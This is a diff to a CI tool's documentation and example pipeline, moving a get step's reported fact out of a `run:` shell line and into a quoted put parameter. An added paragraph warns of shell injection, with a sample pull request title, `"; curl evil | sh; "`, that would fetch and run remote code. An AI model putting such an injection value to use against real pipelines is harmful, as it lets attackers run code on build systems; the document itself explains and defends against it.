@@ -1410,6 +1410,8 @@ resource_types:
       echo {{ .version.id | shellquote }} > id
       printf '{"version": {"id": "412"}, "metadata": [{"name": "url", "value": "https://tickets.example/412"}, {"name": "title", "value": "Add the widget cache"}]}'
     out: |
+      # the get's fact, handed over as a param and quoted by this template
+      test {{ .params.about | shellquote }} = https://tickets.example/412
       printf '{"version": {"id": "2291"}, "metadata": [{"name": "url", "value": "https://tickets.example/412#comment-2291"}]}'
 
 resources:
@@ -1426,11 +1428,12 @@ jobs:
   - get: ticket          # shows url and title under the step
   - task: read
     inputs: [ticket]
-    run: echo "$(cat ticket/id) ((.:ticket.url))"
+    run: cat ticket/id
     assert:
-      # the in: wrote its tree as usual, and a later step reads its facts
-      stdout: 412 https://tickets.example/412
+      stdout: "412"      # the in: wrote its tree as usual
   - put: comment         # shows the comment's url, and lists it as published
+    params:
+      about: ((.:ticket.url))   # a later step reads the get's facts
   assert:
     execution: [ticket, read, comment]
     outcome: succeeded
@@ -1439,6 +1442,8 @@ jobs:
 A name or value is shown as text: control characters are dropped, each is cut at a few kilobytes, and a resource reports at most 64. A value that is not an `http` or `https` address is never a link. Facts pass through the run's secret masking before they are shown or kept, but they are shown to everyone who can read the run, so a resource should report links and titles, not tokens.
 
 **A later step reads a get's facts as `((.:get.name))`** — `((.:ticket.url))` above — as Concourse (v8.1.0 on) does. The name is the get's own, `get: pr` giving `((.:pr.url))` whatever resource it fetches. It follows the rules of a [captured value](templating.md#values-the-run-captures-load_var-and-name): refused at load unless a get earlier in the plan produces it, never hidden in step output (a fact is what the resource chose to show), and a fact the get did not report fails the step that reads it. A name reported twice keeps its last value. A get whose fetch the resource cache reused, or that a resumed run had already fetched, hands over the facts kept with the version.
+
+**A fact in `run:` is shell somebody else wrote.** It is pasted into `sh -c` as text, and a fact is whatever the resource reported: a pull request's title is its author's, so a title of `"; curl evil | sh; "` runs. There is no `shellquote` for `((.:name))` — Concourse's tasks take an argv, not a shell line — so `steps validate` warns on every get's fact in a `run:`. Read the get's own files instead, quoted (`"$(cat pr/title)"`, whichever files its type writes), or hand the fact to a put's `params:`, where a resource template quotes it. The example above hands its `url` to the put that way.
 
 **A step reading a get's facts always runs**: neither a chain skip nor the step cache stands in for it, because the facts are only known once the run is under way — the same version can be fetched with a new title. Steps before it are skipped as usual.
 
